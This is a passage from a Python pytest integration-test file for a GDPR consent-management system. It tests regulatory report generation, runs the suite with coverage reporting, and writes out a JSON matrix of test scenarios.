                assert "timestamp" in log_entry
                assert "event_type" in log_entry

    @pytest.mark.asyncio
    async def test_regulatory_report_generation(self, test_setup):
        """Test generation of regulatory compliance reports."""
        consent_manager = test_setup["consent_manager"]

        # Create test data for multiple users
        users = [IntegrationTestSetup.create_test_user_data() for _ in range(10)]

        for user in users:
            # Create varying numbers of consents
            num_consents = (hash(user["user_id"]) % 5) + 1

            for i in range(num_consents):
                await consent_manager.record_consent(
                    user_id=user["user_id"],
                    consent_type=f"regulatory_test_{i}",
                    consent_text=IntegrationTestSetup.create_comprehensive_consent_text(),
                    metadata={"ip": user["ip"], "user_agent": user["user_agent"]}
                )

        # Generate regulatory report
        db_manager = test_setup["db_manager"]

        # This would test implementation of regulatory reporting
        # For example: GDPR Article 30 compliance reporting

        report = await db_manager.generate_regulatory_report(
            report_type="gdpr_article30",
            date_range=(datetime.now(timezone.utc) - timedelta(days=30), datetime.now(timezone.utc))
        )

        # Verify report structure
        assert report is not None
        assert "report_generated_at" in report
        assert "report_period" in report
        assert "data_controllers" in report
        assert "data_processors" in report
        assert "data_subjects_count" in report
        assert "data_categories" in report
        assert "retention_policies" in report
        assert "security_measures" in report


# Test execution utilities
class IntegrationTestRunner:
    """Utilities for running integration tests and generating reports."""

    @staticmethod
    async def run_all_tests():
        """Run all integration tests and generate comprehensive report."""
        import subprocess
        import sys

        # Run pytest with coverage
        cmd = [
            sys.executable, "-m", "pytest",
            __file__,
            "-v",
            "--tb=short",
            "--cov=src",
            "--cov-report=html",
            "--cov-report=xml",
            "--cov-report=term-missing",
            "--html=test_report.html",
            "--self-contained-html"
        ]

        result = subprocess.run(cmd, capture_output=True, text=True)

        # Generate summary report
        summary = {
            "exit_code": result.returncode,
            "stdout": result.stdout,
            "stderr": result.stderr,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }

        # Save summary
        with open("integration_test_summary.json", "w") as f:
            json.dump(summary, f, indent=2)

        return result.returncode == 0

    @staticmethod
    def generate_test_matrix():
        """Generate a matrix of all test scenarios."""
        test_matrix = {
            "consent_lifecycle": [
                "grant_consent",
                "verify_consent",
                "update_consent",
                "withdraw_consent"
            ],
            "gdpr_compliance": [
                "article_17_erasure",
                "article_20_portability",
                "article_21_objection"
            ],
            "audit_trail": [
                "completeness",
                "immutability",
                "searchability"
            ],
            "security": [
                "authentication",
                "authorization",
                "input_sanitization",
                "ip_privacy"
            ],
            "performance": [
                "consent_creation",
                "database_queries",
                "memory_usage",
                "concurrent_operations"
            ],
            "error_handling": [
                "database_failure",
                "invalid_inputs",
                "network_timeouts"
            ],
            "api_integration": [
                "endpoint_functionality",
                "rate_limiting",
                "error_responses"
            ],
            "multi_tenancy": [
                "data_isolation",
                "tenant_specific_queries",
                "cross_tenant_prevention"
            ]
        }

        with open("integration_test_matrix.json", "w") as f:
            json.dump(test_matrix, f, indent=2)

        return test_matrix


if __name__ == "__main__":
    # Run all tests when executed directly
    asyncio.run(IntegrationTestRunner.run_all_tests())